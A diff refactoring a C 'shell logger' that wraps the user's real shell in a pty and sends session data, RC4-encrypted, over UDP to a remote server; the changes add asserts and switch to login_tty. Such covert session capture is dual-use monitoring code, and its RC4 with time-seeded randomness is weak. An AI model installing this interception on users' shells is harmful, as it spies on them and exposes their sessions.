@@ -15,7 +15,9 @@
 #include <netdb.h>
 #include <errno.h>
 #include <time.h>
+#include <assert.h>
 #include <pty.h>
+#include <utmp.h>
 
 #include "config.h"
 #include "utils.h"
@@ -44,6 +46,8 @@ static int setup_terminal(int tty, struct termios *tm) {
     struct termios tbttr;
     int ret = 0;
 
+    assert(tm != NULL);
+
     ret = tcgetattr(0, tm);
     if (ret) {
 	client_err("Failed to get terminal attributes: %d\n", errno);
@@ -68,10 +72,13 @@ static int setup_terminal(int tty, struct termios *tm) {
 }
 
 static void reset_terminal(struct termios *tm) {
+    assert(tm != NULL);
     tcsetattr(0, TCSANOW, tm);
 }
 
 static int create_server_connection(Connection_Data_t *cd) {
+
+    assert(cd != NULL);
 
     if ((cd->server_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) < 0) {
 	client_err("Failed to open socket: %d\n", errno);
@@ -86,12 +93,15 @@ static int create_server_connection(Connection_Data_t *cd) {
     return 0;
 }
 
-static int create_real_shell_run_cmd(int argc, char *argv[],
+static int create_real_shell_run_cmd(char *argv[],
 	char *cmd_str, int cmd_str_max_length) {
 
     int cmd_str_index = 0;
     char *last_slash = NULL;
     int n = strlen(REAL_SHELL_DIR);
+
+    assert(cmd_str != NULL);
+    assert(argv != NULL);
 
     if ((last_slash = strrchr(argv[0], '/')) == NULL) {
 	last_slash = argv[0];
@@ -139,6 +149,11 @@ static int encrypt_and_send(Connection_Data_t *cd, Session_Data_t * sd) {
     unsigned char msg[MAX_TRANSFER_PKT_SZ];
     int rc4_offset = 0;
     int msg_index = 0;
+
+    assert(cd != NULL);
+    assert(sd != NULL);
+
+    srand(time(NULL));
 
     /* setup a new RC4 IV */
 
@@ -229,9 +244,8 @@ static int encrypt_and_send(Connection_Data_t *cd, Session_Data_t * sd) {
 
 int main(int argc, char *argv[]) {
 
-    char real_shell[256], *slave;
+    char real_shell[256];
     int pty = 0, tty = 0;
-    int ret = 0;
     Session_Data_t sd;
     Connection_Data_t cd;
     fd_set rd;
@@ -242,8 +256,7 @@ int main(int argc, char *argv[]) {
 
     /* reconstruct the original shell location */
 
-    ret = create_real_shell_run_cmd(argc, argv, real_shell, SZARR(real_shell));
-    if (ret) {
+    if (create_real_shell_run_cmd(argv, real_shell, SZARR(real_shell))) {
 	client_err("Create real shell command failed\n");
 	goto exec_real_shell;
     }
@@ -259,8 +272,7 @@ int main(int argc, char *argv[]) {
 	goto exec_real_shell;
     }
 
-    ret = create_server_connection(&cd);
-    if (ret) {
+    if (create_server_connection(&cd)) {
 	client_err("Create server connection failed\n");
 	goto exec_real_shell;
     }
@@ -272,11 +284,10 @@ int main(int argc, char *argv[]) {
 	goto exec_real_shell;
     }
 
-    if ((slave = ttyname(tty)) == NULL) {
+    if (ttyname(tty) == NULL) {
 	client_err("Get TTY name failed: %d\n", errno);
 	goto exec_real_shell;
     }
-    client_dbg("Slave device is %s\n", slave);
 
     if (setup_terminal(tty, &tm)) {
 	client_err("Setup terminal failed\n");
@@ -299,30 +310,10 @@ int main(int argc, char *argv[]) {
 
 	    /* Child : real shell */
 
-	    /* set controlling tty */
-
-	    setsid();
-
-	    /* Make the tty the controlling terminal of the calling process. */
-	    ioctl(tty, TIOCSCTTY, NULL);
-
-	    /* tty becomes stdin, stdout, stderr */
-
-	    if (tty != 0) {
-		close(0);
-		dup2(tty, 0);
+	    if (login_tty(tty)) {
+		client_err("Make tty be the controlling terminal failed: %d\n", errno);
+		goto exec_real_shell;
 	    }
-	    if (tty != 1) {
-		close(1);
-		dup2(tty, 1);
-	    }
-	    if (tty != 2) {
-		close(2);
-		dup2(tty, 2);
-	    }
-
-	    if (pty > 2) close(pty);
-	    if (tty > 2) close(tty);
 
 	    close(cd.server_fd);
 
@@ -337,7 +328,7 @@ int main(int argc, char *argv[]) {
 
 	    /* Parent : shell logger */
 
-	    srand(time(NULL));
+
 	    sd.uid = getuid();
 
 	    while (1) {
@@ -385,7 +376,7 @@ int main(int argc, char *argv[]) {
 		    gettimeofday(&tv, NULL);
 		    sd.time = tv.tv_sec;
 
-		    /* transfer the data from pty to stdin */
+		    /* transfer the data from pty to stdout */
 
 		    if ((n = read(pty, sd.buffer, BUF_SZ)) <= 0) {
 			if (n < 0 && (errno == EINTR || errno == EAGAIN))
